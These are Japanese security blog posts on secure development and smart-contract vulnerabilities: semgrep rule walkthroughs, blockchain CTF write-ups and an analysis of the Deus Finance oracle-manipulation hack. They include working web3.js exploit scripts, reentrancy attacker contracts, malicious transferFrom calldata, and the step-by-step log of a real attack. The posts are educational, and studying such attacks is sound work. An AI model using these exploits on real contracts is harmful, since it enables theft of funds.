[{"categories":null,"contents":"   NIST SSDF v1.1の概要  この文書は、以下の4つのグループから構成されています。\n Prepare the Organization (組織を準備する) Protect the Software (ソフトウェアを守る) Produce Well-Secured Software (セキュアなソフトウェアを作る) Respond to Vulnerabilities (脆弱性に対処する)  これらのグループには、いくつかのプラクティスが含まれます。 プラクティスには、タスク、想定される実施例、参考文献が含まれます。\nこの記事では、プラクティスに焦点を当て、プラクティスを実践するためのツールやフレームワークについて記述します。 プラクティスの翻訳や解釈には独自の考えを含むので、組織や状況によって上手く変更して適用してください。 断りがない場合、基本的にはWebアプリケーション開発を想定して記述します。\n   Prepare the Organization (PO)  PO.1: ソフトウェア開発のためのセキュリティ要件を定義する PO.2: 役割と責任を導入する PO.3: サポートツールチェーンを導入する PO.4: ソフトウェアのセキュリティチェックのための基準を定義し使用する PO.5: ソフトウェア開発のための安全な環境を実装し維持する この章では、セキュアな開発に取り組む上で必要となる事柄について記述されています。\nPO.1でセキュリティ要件を定義すると記述されていますが、一から要件を作って行くのは大変です。 組織で作っているものがWebアプリケーションである場合は、OWASP ASVSなどが使えそうです。 OWASP ASVSは一般的なWebアプリケーションに利用する想定なので、組織固有の要件を洗い出すには脅威モデリングなどが活用できそうです。\nPO.2は、セキュリティチャンピオンの指名や教育というアクションが適当そうです。 セキュリティチャンピオンについては、以下のような資料が参考になります。\n OWASP Security Culture メルカリで「セキュリティチャンピオン」育成プログラムが開始！その内容と“発足した理由”を紹介  PO.3は、DAST / SAST / SCAや、その他ツール類の導入が適当そうです。 このあたりのツールは無数にあるので、開発の邪魔にならない範囲で順番に対処していくのが良さそうです。\nPO.4、PO.5は組織やアプリケーションによって異なります。\n   Protect the Software (PS)  PS.1: コードを不正アクセスや改ざんから守る PS.2: リリースの完全性を検証する仕組みの提供 PS.3: ソフトウェアリリースごとにアーカイブし保護する この章では、ソフトウェアのすべてのコンポーネントを改ざんや不正アクセスから保護しようと言う事が記述されています。\nこの章に書いてあることを実践するのは、作っているアプリケーションの種類によってやるべきことは違ってきそうです。\n一例として、kubernetesを使っている状況を考えてみます。 kubernetesの場合では、署名したコンテナのみをデプロイできるように設定するなどがこれにあたりそうです。\n sigstore/cosign 署名検証でKubernetesのデプロイメントをセキュアにする方法     Produce Well-Secured Software (PW)  PW.1: セキュリティ要件を満たすソフトウェアの設計 PW.2: セキュリティ要件を満たすようレビューを行う PW.3: - PW.4: 機能の再実装を避け、安全性の高い既存ソフトウェアを利用する PW.5: セキュアコーディングの実践 PW.6: コンパイル、インタプリタ、ビルドプロセスの設定による実行ファイルのセキュリティ向上 PW.7: 人間が読むことのできるコードのレビューや分析を行う PW.8: 実行可能なコードをテストして脆弱性を特定する PW.9: ソフトウェアがデフォルトでセキュアな設定になるようにする この章では、セキュアなソフトウェア開発をするための方法について記述してあります。\nPW.1からPW.6の内容は、特定のツールやフレームワークを使うことで解決できるものではなく、開発者自身が実践していくべき内容が多いように見受けられます。\nPW.7 / PW.8はSAST / DASTを使うことで解決できそうですが、PO.3と重複していそうです。\nPW.9は状況やコンテキストによって変わってきますが、IaaSを使うということを一例に考えてみます。 IaaSへのデプロイにterraformを使っている場合、aquasecurity/tfsecなどを利用することができそうです。 terraformを使っていない場合でも、CSPMなどが利用できるかもしれません。\n   Respond to Vulnerabilities (RV)  RV.1: 継続的な脆弱性の特定と確認 RV.2: 脆弱性の評価、優先順位付け、および修正 RV.3: 脆弱性を分析し、その根本的な原因を特定する この章では、脆弱性の対処について記述してあります。\n大きな組織にはたくさんのサービスがあり、複数のサービスやスキャナから脆弱性の情報が上がってくる状況になっていると思います。 そのような環境では、以下のような脆弱性管理基盤みたいなものがあると、マネジメントが非常に楽になりそうです。\nSisyphus and the CVE Feed: Vulnerability Management at Scale\n","date":"Oct 14","permalink":"https://mute1997.github.io/post/2022-10-15-nist-ssdf-v1.1/","tags":["security"],"title":"セキュアなソフトウェア開発とは何かをNIST SSDF v1.1から読み解く"},{"categories":null,"contents":"semgrep-smart-contracts というリポジトリがあります。 これは、スマートコントラクトの脆弱性を発見するためのsemgrepルールをまとめたものです。\n今回は、basic-arithmetic-underflowというルールを読んでみます。\n basic-arithmetic-underflow.yaml basic-arithmetic-underflow.sol     検出ルール  検出ルールは、以下の通りです。\nこのルールはまだBETAであり、まだsemgrepでは検出できません。\n1 2 3 4 5 6 7 8  pattern-sinks:- pattern:$Y - $Xpattern-sources:- pattern-either:- pattern-inside:|function $F(..., $X, ...) external { ... }- pattern-inside:|function $F(..., $X, ...) public { ... }     underflowとは  solidityの特定のバージョンでは、型の下限値を超えてデクリメントをしてしまった場合、意図しない動作を誘発する恐れがあります。\n例として、solidityでuint8の変数を使うことを考えます。\nこのuint8の変数が0のとき、デクリメントすると255になってしまいます。\n1 2  uint8 balance = 0; balance--; // balance == 255   この挙動は、solidity \u0026gt;= 0.8 からデフォルトでチェックされるように修正されたそうです。\nこのチェックを除外してコンパイルするためには、以下のようにuncheckedという構文を利用できるようです。\n1 2 3  unchecked { balance--; }      RemittanceTokenでの事例  この脆弱性が存在した、RemittanceTokenというコントラクトについて解説します。\nRemittanceTokenは、ERC20のトークンで、このトークンのburn関数にバグがあります。\nburn関数のソースコードは以下の通りです。\n1 2 3 4 5 6 7 8  //Burn tokens from owner account function burn(uint256 _count) public returns (bool success) { balanceOf[msg.sender] -=uint112( _count); deleteToken = _count.add(deleteToken).toUINT112(); _totalSupply = _totalSupply.sub(_count).toUINT112(); Burn(msg.sender, _count); return true; }   2行目の計算にバグがあります。\n1  balanceOf[msg.sender] -=uint112( _count);   このトークンを持っていない場合、0-_countの計算が発生するため、underflowが発生します。\nその結果、攻撃者はこのトークンを無限に手に入れることが出来ます。\n","date":"Jun 07","permalink":"https://mute1997.github.io/post/2022-06-07-semgrep-smart-contracts-4/","tags":["security"],"title":"semgrep-smart-contractsをすべて読む #04 (basic-arithmetic-underflow)"},{"categories":null,"contents":"   概要  Security Innovation Blockchain CTF\nSecurity Innovationという企業が開催している、常設のCTFがあります。 今回は、Piggy Bankという問題を解きました。\n   問題  貯金箱のようなアプリで、ownerのみが資金を出し入れできる実装になっています。\n   ソースコードを読む  PiggyBankというコントラクトが本体の実装になっており、CharliesPiggyBankはそれを継承したアプリです。\nCharliesPiggyBankは、collectFundsという資金引き出し用の関数のみをoverrideしています。\nPiggyBankにはonlyOwnerというmodifierが付いているものの、CharliesPiggyBankでoverrideされた関数では、modifierが付与されていません。\nそのため、継承先のアプリではcollectFundsが誰でも呼び出し可能になっているようです。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59  pragma solidity 0.4.24; import \u0026#34;../CtfFramework.sol\u0026#34;; import \u0026#34;../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\u0026#34;; contract PiggyBank is CtfFramework{ using SafeMath for uint256; uint256 public piggyBalance; string public name; address public owner; constructor(address _ctfLauncher, address _player, string _name) public payable CtfFramework(_ctfLauncher, _player) { name=_name; owner=msg.sender; piggyBalance=piggyBalance.add(msg.value); } function() external payable ctf{ piggyBalance=piggyBalance.add(msg.value); } modifier onlyOwner(){ require(msg.sender == owner, \u0026#34;Unauthorized: Not Owner\u0026#34;); _; } function withdraw(uint256 amount) internal{ piggyBalance = piggyBalance.sub(amount); msg.sender.transfer(amount); } function collectFunds(uint256 amount) public onlyOwner ctf{ require(amount\u0026lt;=piggyBalance, \u0026#34;Insufficient Funds in Contract\u0026#34;); withdraw(amount); } } contract CharliesPiggyBank is PiggyBank{ uint256 public withdrawlCount; constructor(address _ctfLauncher, address _player) public payable PiggyBank(_ctfLauncher, _player, \u0026#34;Charlie\u0026#34;) { withdrawlCount = 0; } function collectFunds(uint256 amount) public ctf{ require(amount\u0026lt;=piggyBalance, \u0026#34;Insufficient Funds in Contract\u0026#34;); withdrawlCount = withdrawlCount.add(1); withdraw(amount); } }      エクスプロイト  1 2 3 4 5 6 7 8 9 10 11 12 13  const Web3 = require(\u0026#39;web3\u0026#39;) const HDWalletProvider = require(\u0026#34;@truffle/hdwallet-provider\u0026#34;) const fs = require(\u0026#39;fs\u0026#39;); require(\u0026#39;dotenv\u0026#39;).config() const web3 = new Web3(new HDWalletProvider(process.env.PRIVATE_KEY, process.env.PROVIDER_URL)) const abi = JSON.parse(fs.readFileSync(\u0026#39;./src/abi.json\u0026#39;)) const contract = new web3.eth.Contract(abi, \u0026#39;0x27e03071617a155c88603ffc322262c47b209d03\u0026#39;) contract.methods.piggyBalance().call().then(wei =\u0026gt; { const option = {from: \u0026#39;0xd7544D522B75347b48917649ebc5D334b3D43445\u0026#39;} contract.methods.collectFunds(wei).send(option) })      どう実装されているべきか  modifierはoverrideされた関数には継承されないため、overrideした関数にも正しいmodifierを付与する必要があります。\n1 2 3 4 5  function collectFunds(uint256 amount) public onlyOwner ctf{ require(amount\u0026lt;=piggyBalance, \u0026#34;Insufficient Funds in Contract\u0026#34;); withdrawlCount = withdrawlCount.add(1); withdraw(amount); }   ","date":"Jun 04","permalink":"https://mute1997.github.io/post/2022-06-04-piggybank-writeup/","tags":["security","ctf"],"title":"Security Innovation Blockchain CTF - Piggy Bank"},{"categories":null,"contents":"   概要  Security Innovation Blockchain CTF\nSecurity Innovationという企業が開催している、常設のCTFがあります。 今回は、Lock Boxという問題を解きました。\n   問題  問題を開くと、以下のような画面が出てきます。\nピンを入力してUnlockボタンを押すと、スマートコントラクトが保有している資産を取得できるというアプリのようです。\n   ソースコードを読む  constructorではアンロックするためのpinが生成されており、unlock関数で資金を送金するというコードのようです。\nunlock関数はpinを受け取り、constructorで生成したpinと同一であれば、資金が送金されるようです。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  pragma solidity 0.4.24; import \u0026#34;../CtfFramework.sol\u0026#34;; contract Lockbox1 is CtfFramework{ uint256 private pin; constructor(address _ctfLauncher, address _player) public payable CtfFramework(_ctfLauncher, _player) { pin = now%10000; } function unlock(uint256 _pin) external ctf{ require(pin == _pin, \u0026#34;Incorrect PIN\u0026#34;); msg.sender.transfer(address(this).balance); } }      エクスプロイト  この問題を解くには、uint256 private pinとして格納されているpinを取得出来る必要があります。 この変数はブロックチェーン上に保存されるものなので、読み取り可能です。\nweb3.jsを使って書いたエクスプロイトは以下の通りです。 getStorageAtという関数を使ってpinを取り出しています。\n1 2 3 4 5 6 7  const Web3 = require(\u0026#39;web3\u0026#39;) const HDWalletProvider = require(\u0026#34;@truffle/hdwallet-provider\u0026#34;) require(\u0026#39;dotenv\u0026#39;).config() const web3 = new Web3(new HDWalletProvider(process.env.PRIVATE_KEY, process.env.PROVIDER_URL)) web3.eth.getStorageAt(\u0026#34;0x258e6ed1bebd27f05dc466993edd9720ceb3877a\u0026#34;, 1).then(storage =\u0026gt; console.log(parseInt(storage)))      どう実装されているべきか  Commit-Revealというパターンを使うことで、ブロックチェーンに機密を保存出来るようです。\n https://karl.tech/learning-solidity-part-2-voting/ https://medium.com/layerx-jp/smart-contract-design-pattern-34a6401fe743  ","date":"Jun 01","permalink":"https://mute1997.github.io/post/2022-06-01-lockbox-writeup/","tags":["security","ctf"],"title":"Security Innovation Blockchain CTF - Lock Box"},{"categories":null,"contents":"スマートコントラクトに対する検査ツールについて調査しました。\n   Mythril  MythrilはEVMバイトコードに対する検査ツールです。 Symbolic execution / SMT resolver / taint analysisを使用して、問題の検出を行います。\n検出可能なモジュールは以下のページで確認できます。\nAnalysis Modules\n   MythX  複数の静的解析ツールを組み合わせたSaaSサービスです。\n詳細は以下のブログで確認できます。\nMythX Tech: Behind the Scenes of Smart Contract Security Analysis\nこのブログによると、内部的には以下のツールが用いられているようです。\n Maru (Static code analysis) Harvey (Greybox Fuzzing) Mythril (Symbolic Execution and SMT Solving)  Maruについては情報が見つかりませんでしたが、Harveyというツールは、論文として発表されているツールのようです。\nHarvey: A Greybox Fuzzer for Smart Contracts\n   slither  SlithIRという中間表現を利用し、テイント解析を行うツールです。\n2022年5月現在、76のDetectorに対応しているようです。\n以下のページで、今まで検出した脆弱性の一覧がリストされています。\nhttps://github.com/crytic/slither/blob/master/trophies.md\n   Echidna  スマートコントラクトのファジングツールです。古典的なファザーのようにクラッシュを探すのではなく、不変状態を破ろうとするプロパティベースのファジングツールです。\n以下のサイトにチュートリアルがあります。\nhttps://github.com/crytic/building-secure-contracts/tree/master/program-analysis/echidna\n   Manticore  シンボリック実行を利用した検査ツールです。\n詳細は以下の論文に記述してあります。\nhttps://arxiv.org/abs/1907.03890\n論文によると、Manticoreは平均65.64%のカバレッジを達成しているそうです。\nこちらにチュートリアルがあり、使う際にはこちらも利用できそうです。\n","date":"May 18","permalink":"https://mute1997.github.io/post/2022-05-18-solidity-tools/","tags":["security"],"title":"スマートコントラクトの検査ツール調査"},{"categories":null,"contents":"semgrep-smart-contracts というリポジトリがあります。 これは、スマートコントラクトの脆弱性を発見するためのsemgrepルールをまとめたものです。\n今回は、basic-reentrancyというルールを読んでみます。\n basic-reentrancy.yaml basic-reentrancy.sol     検出ルール  検出ルールは、以下の通りです。\nこのルールはまだBETAであり、まだsemgrepでは検出できません。\n1 2 3 4 5 6 7 8 9  patterns:- pattern-either:- pattern-inside:|function $F(..., $X, ...) external { ... }- pattern-inside:|function $F(..., $X, ...) public { ... }- pattern-not-inside:|function $F(..., $X, ...) onlyOwner { ... }- pattern:$X.$M(...)     Reentrancy attackとは  reentrant (再入可能性) とは、ある関数の実行中に、同じ関数を実行しても安全であるという性質のことを指します。\nスマートコントラクトにおいては、攻撃対象から、任意のコントラクトを呼び出し可能な場合にReentrancy attackが発生する恐れがあります。\nこの攻撃は、以下の論文で詳細に解説されています。\nReentrancy Vulnerability Identification in Ethereum Smart Contracts\n論文では、\n Single Function Reentrancy attack Cross Function Reentrancy attack  という２つの攻撃に分類されています。\n   fallback / receive関数  この攻撃を理解する前に、前提条件としてfallback / receive関数について知る必要があります。\nreceive関数は、スマートコントラクトが送金を受け取った時に呼び出される関数です。 receive関数が定義されていないなどで呼び出せなかった場合には、fallback関数が呼び出されます。\nそれぞれ、以下のような特殊な関数として記述されます。\n1 2 3 4 5 6 7  contract Sample { receive() external payable { } fallback() external payable { } }      Single Function Reentrancy attack  Single Function Reentrancy attackは、単一の関数で発生するReentrancy attackです。\n具体例として、以下のようなスマートコントラクトを考えます。 これは、預け入れたものをwithdraw関数で引き出すことが可能なスマートコントラクトになります。\n1 2 3 4 5 6 7 8 9 10 11 12  // 被害者コード contract ContractA { ... // 引き出し  function withdraw() external { receiver.transfer(amount); balances[receiver] -= amount; } ... }   攻撃のためのエクスプロイトコードは以下の通りです。\nreceiveという関数があり、その関数内では他コントラクトが呼び出されています。\n1 2 3 4 5 6  // 攻撃者コード contract ContractB { receive() external payable { contractA.withdraw(); } }   エクスプロイトの流れを以下に記しました。\n 1 ) 攻撃者がcontractBを呼び出し 2 ) contractBがwithdraw関数を呼び出し 3 ) contractAに制御が移り、送金が行われる 4 ) 送金により、contractBのreceive関数が呼び出される 5 ) receive関数内で、再度withdraw関数の呼び出し 6 ) 繰り返し ... ... ... 上記に記載した流れが続くことで、攻撃者は無限に引き出しを行うことが出来ます。\nこれは、状態を更新する前に送金を行ってしまっているために起こっています。\n以下のように修正することで、攻撃を防ぐことが可能になります。\n1 2 3 4 5 6 7 8 9 10 11  contract ContractA { ... // 引き出し  function withdraw() external { balances[receiver] -= amount; receiver.transfer(amount); } ... }      Cross Function Reentrancy attack  Cross Function Reentrancy attackも基本は同じで、状態を共有する2つの関数がある場合に起こります。\n具体例として、以下のようなスマートコントラクトがあることを考えます。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  mapping (address =\u0026gt; uint) private balance; function transfer(address to, uint amount) { if (balance[msg.sender] \u0026gt;= amount){ balance[to] += amount; balance[msg.sender] -= amount; } } function withdraw() public { uint amount = balance[msg.sender]; require(msg.sender.call.value(amount)()); /* At this point, the caller’s code is executed, and can call transfer() */ balance[msg.sender] = 0; }   攻撃者がwithdrawを呼び出した段階で残高が更新されていないため、receive関数がtransferを呼び出すことで資金の抜き取りが可能となります。\n","date":"May 12","permalink":"https://mute1997.github.io/post/2022-05-12-semgrep-smart-contracts-3/","tags":["security"],"title":"semgrep-smart-contractsをすべて読む #03 (basic-reentrancy)"},{"categories":null,"contents":"   概要  Security Innovation Blockchain CTF\nSecurity Innovationという企業が開催している、常設のCTFがあります。 今回は、Donationという問題を解きました。\n   問題  問題を開くと、寄付をするためのアプリケーションであることが分かります。\nDonate 0.1 Ether!をクリックするとMetaMaskが起動し、0.1 Etherが寄付されます。\nこのアプリケーションのソースコードとして、以下のSolidityファイルが渡されます。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  pragma solidity 0.4.24; import \u0026#34;../CtfFramework.sol\u0026#34;; import \u0026#34;../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\u0026#34;; contract Donation is CtfFramework{ using SafeMath for uint256; uint256 public funds; constructor(address _ctfLauncher, address _player) public payable CtfFramework(_ctfLauncher, _player) { funds = funds.add(msg.value); } function() external payable ctf{ funds = funds.add(msg.value); } function withdrawDonationsFromTheSuckersWhoFellForIt() external ctf{ msg.sender.transfer(funds); funds = 0; } }   コードを読んでみると、withdrawDonationsFromTheSuckersWhoFellForItという関数があるのが分かります。\nこの関数は、msg.senderに今まで寄付されたfundsを送信する関数で、呼び出し可能なユーザーに制限がありません。\nそのため、この関数を呼び出すことで、今まで寄付されたEthereumを引き出すことが可能になります。\n   エクスプロイト  デプロイされたコントラクトの呼び出しには、MyCryptoなどが利用できますが、 今回はあえてweb3.jsを使って書いてみます。\n1 2 3 4 5 6 7 8 9 10 11 12 13  const Web3 = require(\u0026#39;web3\u0026#39;) const HDWalletProvider = require(\u0026#34;@truffle/hdwallet-provider\u0026#34;) const fs = require(\u0026#39;fs\u0026#39;); require(\u0026#39;dotenv\u0026#39;).config() const web3 = new Web3(new HDWalletProvider(process.env.PRIVATE_KEY, process.env.PROVIDER_URL)) const abi = JSON.parse(fs.readFileSync(\u0026#39;./src/abi.json\u0026#39;)) const contract = new web3.eth.Contract(abi, \u0026#39;0xaa51c14d9ff94ee5a5674ee0af8257f1665956f3\u0026#39;) // withdrawDonationsFromTheSuckersWhoFellForIt関数の呼び出し const option = {from: \u0026#39;0xd7544D522B75347b48917649ebc5D334b3D43445\u0026#39;} contract.methods.withdrawDonationsFromTheSuckersWhoFellForIt().send(option)      どう実装されているべきか  今回の問題は、コントラクトのオーナーのみが利用できるべき機能が、誰でも呼び出し可能になってしまっていることに問題があります。 そのため、コントラクト側でオーナーか否かの判定を入れれば良いことになります。\nSolidityにはOpenZeppelinというライブラリがあり、 このライブラリにはOwnableというコントラクトがあります。\n以下のように、onlyOwnerというmodifierをつけることで、デプロイしたオーナーのみが関数を呼び出せるように制限することが可能です。\n詳細はドキュメントを参照してください。\nhttps://docs.openzeppelin.com/contracts/2.x/access-control\n1 2 3 4 5 6 7  import \u0026#34;@openzeppelin/contracts/ownership/Ownable.sol\u0026#34;; contract A is Ownable { function somethingSecret() public onlyOwner { // オーナーからの呼び出しのみを許可  } }   ","date":"May 11","permalink":"https://mute1997.github.io/post/2022-05-12-donation-writeup/","tags":["security","ctf"],"title":"Security Innovation Blockchain CTF - Donation"},{"categories":null,"contents":"semgrep-smart-contracts というリポジトリがあります。 これは、スマートコントラクトの脆弱性を発見するためのsemgrepルールをまとめたものです。\n今回は、arbitrary-low-level-callというルールを読んでみます。\n arbitrary-low-level-call.yaml arbitrary-low-level-call.sol     検出ルール  検出ルールは、以下の通りです。\nこのルールは、betaであり、semgrepではまだ検出は出来ないようです。\n1 2 3 4 5 6 7  patterns:- pattern-either:- pattern-inside:|function $F(..., $ADDR, ...) external { ... }- pattern-inside:|function $F(..., $ADDR, ...) public { ... }- pattern:$ADDR.call($DATA);  この脆弱性は、引数で渡されたアドレスに対し、call関数が呼ばれた場合に検知するものです。\ncall関数は、アドレス型の関数で、別スマートコントラクトの関数を呼び出すためのものです。 詳細は以下のドキュメントを参照してください。 https://docs.soliditylang.org/en/develop/types.html#members-of-addresses\nこの脆弱性は、特定のスマートコントラクトやユーザーに対してのみ許可している操作を、攻撃者が任意で呼び出せてしまうことに問題があります。\n攻撃者は、transferFromなどの送金用関数を自分のアドレスに対して利用することで、資金を盗むことが可能になります。\n   Li Financeでの事例  この脆弱性を悪用した攻撃が、Li Financeで発生しました。 攻撃トランザクションとエクスプロイトコードは以下の通りです。\n Transaction Exploit  問題が起こったのは、swapAndStartBridgeTokensViaCBridge関数です。\nこの関数は、_swapDataという関数を受け取り、callDataを引数としてcallToに対して関数が呼び出されています。\n1 2 3 4 5 6 7 8 9 10 11  function swapAndStartBridgeTokensViaCBridge( LiFiData memory _lifiData, LibSwap.SwapData[] calldata _swapData, CBridgeData memory _cBridgeData ) public payable { ... LibSwap.swap(_lifiData.transactionId, _swapData[i]); ... }   1 2 3 4 5 6 7  function swap(bytes32 transactionId, SwapData calldata _swapData) internal { ... (bool success, bytes memory res) = _swapData.callTo.call{ value: msg.value }(_swapData.callData); ... }   攻撃者は、\n callToをスマートコントラクトの呼び出しが許可されているアドレスに設定 callDataにtransferFrom関数を利用する  ことで、自身のアドレスへの送金を行うことが可能でした。\n1 2 3 4 5 6 7  _swapData[1].callTo = address(MATIC); _swapData[1].callData = abi.encodeWithSignature( \u0026#34;transferFrom(address,address,uint256)\u0026#34;, 0x445C21166a3Cb20b14FA84Cfc5D122F6bd3fFa17, address(this), transferAmount(MATIC, 0x445C21166a3Cb20b14FA84Cfc5D122F6bd3fFa17) );   ","date":"May 04","permalink":"https://mute1997.github.io/post/2022-05-04-semgrep-smart-contracts-2/","tags":["security"],"title":"semgrep-smart-contractsをすべて読む #02 (arbitrary-low-level-call)"},{"categories":null,"contents":"semgrep-smart-contracts というリポジトリがあります。 これは、スマートコントラクトの脆弱性を発見するためのsemgrepルールをまとめたものです。\nこのリポジトリの、検出ルールと脆弱なコードを読んでいくことで、スマートコントラクトの脆弱性を学びます。今回は、以下のルールを読んでいきます。\n basic-oracle-manipulation.yaml basic-oracle-manipulation.sol     検出ルール  まず、semgrepのルールを理解するために、ルールを日本語として表現します。\n 関数内の処理であること 関数の名称が (?i)get([a-z0-9_])*price にマッチすること $X.div($Y)、もしくは$X / $Yであること $Xは以下の文字列のどれかを含むこと  underlying underlyingUnit pair reserve reserve0 reserve1   $Yは.*totalSupply.*にマッチすること  このルールを実行すると、以下の2つがsemgrepによって検出されます。\n1 2 3  101┆ _sharePrice = totalSupply() == 0 102┆ ? underlyingUnit 103┆ : underlyingUnit.mul(balanceWithInvested()).div(totalSupply());   1 2  355┆ ((dei.balanceOf(address(pair)) + (usdc.balanceOf(address(pair)) * 1e12)) * 356┆ 1e18) / pair.totalSupply();   ルールと、何が検出されるのかは分かったものの、これだけでは何が脆弱なのか分からないので、エクスプロイトを調べてみます。\n   エクスプロイト  このスマートコントラクトに刺さるエクスプロイトを調べてみます。 Deus Financeというプロジェクトで、この手法を用いたハッキング被害が起こったようです。\n Deus Financeなど複数のDeFiプロトコルで16億円超のハッキング被害 The Deus Hack Explained Deus Finance oracle attack event analysis DEUS post mortem  GitHubにエクスプロイトがあったので、これを読んで見ることにします。\nhttps://github.com/PwnedNoMore/postmortem/blob/main/2022/deus/contracts/Exploit.sol\n注意として、このエクスプロイトは2022年の3/15に発生したエクスプロイトになります。\nDeus Financeでは、2022年の4/28にもオラクルを操作した問題が再発生しています。\nまずはローカルのネットワークでこのエクスプロイトを実行をしてみます。 もともと hardhat.config.js に指定されているURLではダメなようなので、https://rpc.fantom.network/に変更して動作させます。\n1 2 3 4  forking: { url: \u0026#34;https://rpc.fantom.network/\u0026#34;, blockNumber: 33466613 }   npx hardhat run scripts/main.js コマンドを実行すると、以下のような出力が得られます。\n [+] (0) before attack [+] my USDC balance: 0 [+] my DEI balance: 0 [+] spirit USDC reserve: 9713881664165 [+] spirit DEI reserve: 9739342685820948870544271 [+] the amount of DEI to borrow (spirit): 9739342685820948870544270 [+] the amount of DEI to pay back (spirit): 9768648631716097162030362 [+] (1) flash swap from spirit pool [+] my USDC balance: 0 [+] my DEI balance: 9739342685820948870544270 [+] sAMM USDC reserve: 24660757275320 [+] sAMM DEI reserve: 24772798349205085390700207 [+] the amount of DEI to borrow (sAMM): 24772798349205085390700206 [+] the amount of DEI to pay back (sAMM): 24775275876792764667166923 [+] sAMM LP price: 2000000005487107362736617 [+] (2) flash swap from sAMM pool [+] my USDC balance: 0 [+] my DEI balance: 34512141035026034261244476 [+] my LP deposit token balance: 0 [+] my LP token balance: 0 [+] sAMM LP price: 997733504354413127115105 [+] (3) liquidate the assets of victims [+] my USDC balance: 0 [+] my DEI balance: 27150599219672207566872765 [+] my LP deposit token balance: 5230026958164438186 [+] my LP token balance: 0 [+] (4) exit the flash swap from sAMM pool [+] my USDC balance: 0 [+] my DEI balance: 2375323342879442899705842 [+] my LP deposit token balance: 5230026958164438186 [+] my LP token balance: 0 [+] (5) deposit LP deposit tokens to earn LP tokens [+] my LP deposit token balance: 0 [+] my LP token balance: 5230026958164438186 [+] (6) remove liquidity [+] my USDC balance: 5218173124837 [+] my DEI balance: 7617204163068582172512381 [+] my LP token balance: 0 [+] (7) swap USDC to DEI from sAMM pool [+] my USDC balance: 0 [+] my DEI balance: 12787419360961504871925327 [+] (8) exit the flash swap from spirit pool [+] my USDC balance: 0 [+] my DEI balance: 3018770729245407709894965 [+] (9) swap DEI to USDC from sAMM pool [+] my USDC balance: 3064570164495 [+] my DEI balance: 0 全部で9つのステップあるので、1ステップずつ読んでいきます。\n   1 ) フラッシュスワップでDEIの借り入れ  エクスプロイトではまず、 0x8eFD36aA4Afa9F4E157bec759F1744A7FeBaEA0e から、フラッシュスワップを利用してDEIを借り入れます。\nフラッシュスワップについてはこちらを参照してください。\nhttps://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps\n1  spiritUsdcDei.swap(0, _reserve1 - 1, me, abi.encode(uint8(0x1)));   この借り入れは、オラクルを操作した後、ユーザーの負債を返却する際に利用されます。\nswapのコールバック関数の中で、my DEI balanceが大きく増えていることが確認できます。\n [+] (1) flash swap from spirit pool [+] my USDC balance: 0 [+] my DEI balance: 9739342685820948870544270 [+] sAMM USDC reserve: 24660757275320 [+] sAMM DEI reserve: 24772798349205085390700207 [+] the amount of DEI to borrow (sAMM): 24772798349205085390700206 [+] the amount of DEI to pay back (sAMM): 24775275876792764667166923 [+] sAMM LP price: 2000000005487107362736617    2 ) オラクル計算元からDEIの借り入れ  次に、0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0 から、DEIを借り入れます。\nこれは、上記アドレスのDEI, USDCの残高がオラクルとして用いられているため、それを操作する目的で借り入れるものです。\nこのようにして大量に借り入れることで価値が下がり、ユーザーの清算処理を行うことができます。\n1  sAMMUsdcDei.swap(0, _reserve1 - 1, me, abi.encode(uint8(0x2)));   借り入れ後、さらにmy DEI balanceが上昇していることが分かります。\n [+] (2) flash swap from sAMM pool [+] my USDC balance: 0 [+] my DEI balance: 34512141035026034261244476 [+] my LP deposit token balance: 0 [+] my LP token balance: 0 [+] sAMM LP price: 997733504354413127115105    3 ) 特定ユーザーの清算処理  以下のコードが呼び出され、特定のユーザーに対して清算処理が行われます。\n1 2  dei.approve(deiLenderSolidex.mintHelper(), dei.balanceOf(me)); deiLenderSolidex.liquidate(victims, me);   清算処理が実行されると、以下のコードが呼び出されます。\n1 2 3 4 5 6 7 8 9 10 11  function isSolvent(address user) public view returns (bool) { // accrue must have already been called!  uint256 userCollateralAmount = userCollateral[user]; if (userCollateralAmount == 0) return getDebt(user) == 0; return userCollateralAmount.mul(oracle.getPrice()).mul(LIQUIDATION_RATIO) / (uint256(1e18).mul(1e18)) \u0026gt; getDebt(user); }   このとき、清算処理が実際に行われるかどうかを判断するために、getPrice関数が呼び出されます。 この関数は、プールしてあるDEIとUSDCの量から、DEIの価格を返却する関数です。\nステップ2でフラッシュスワップしているため、DEIの残高が低下しています。 そのため、担保割れしていると判断され、清算処理が行われます。\n1 2 3 4 5  function getPrice() external view returns (uint256) { return ((dei.balanceOf(address(pair)) + (usdc.balanceOf(address(pair)) * 1e12)) * 1e18) / pair.totalSupply(); }    [+] (3) liquidate the assets of victims [+] my USDC balance: 0 [+] my DEI balance: 27150599219672207566872765 [+] my LP deposit token balance: 5230026958164438186 [+] my LP token balance: 0    4 ) ステップ2でフラッシュスワップしたものを返却  攻撃の肝となる部分はほとんど終わったため、ここから先はフラッシュスワップの返却やLPトークンの売却などが行われます。\nこのステップでは、ステップ2で借り入れていたDEIの返却を行っています。\nログから、my DEI balanceが低下していることが分かります。\n [+] (4) exit the flash swap from sAMM pool [+] my USDC balance: 0 [+] my DEI balance: 2375323342879442899705842 [+] my LP deposit token balance: 5230026958164438186 [+] my LP token balance: 0    5 ) LPトークンの引き出し  depositされているLPトークンを引き出します。\n [+] (5) deposit LP deposit tokens to earn LP tokens [+] my LP deposit token balance: 0 [+] my LP token balance: 5230026958164438186    6 ) LPトークンのburn  清算したことで得られたLPトークンをburnし、USDCとDEIを得ます。\nhttps://docs.uniswap.org/protocol/V2/concepts/protocol-overview/how-uniswap-works\n1 2 3 4 5  // prepare the LP burning ERC20(address(sAMMUsdcDei)).transfer(address(sAMMUsdcDei), sAMMUsdcDei.balanceOf(me)); // burn the LP sAMMUsdcDei.burn(me);   my LP token balanceが0になり、my USDC balance / my DEI balanceが増加していることが分かります。\n [+] (6) remove liquidity [+] my USDC balance: 5218173124837 [+] my DEI balance: 7617204163068582172512381 [+] my LP token balance: 0    